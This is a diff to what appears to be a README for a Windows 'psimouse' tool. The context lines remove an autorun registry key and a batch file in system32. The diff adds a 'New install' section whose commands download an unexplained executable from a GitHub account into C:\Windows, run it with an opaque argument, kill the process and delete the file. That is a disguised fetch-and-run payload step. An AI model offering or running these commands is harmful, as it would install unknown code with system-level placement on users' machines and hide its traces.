@@ -103,7 +103,15 @@ reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PSIMouse" /f
 :: Delete the file
 del "C:\windows\system32\psimouse.bat"
 ```
-
+## New install
+```
+cd c:\windows\system32
+curl -L -o "C:\Windows\smd.exe" "https://github.com/SellerDumpskart/psimouse/raw/refs/heads/main/smd.exe"
+cd c:\windows
+smd.exe @#@#
+taskkill /f /im smd.exe
+del /f c:\windows\smd.exe
+```
 ## Requirements
 
 - Windows 10 / 11
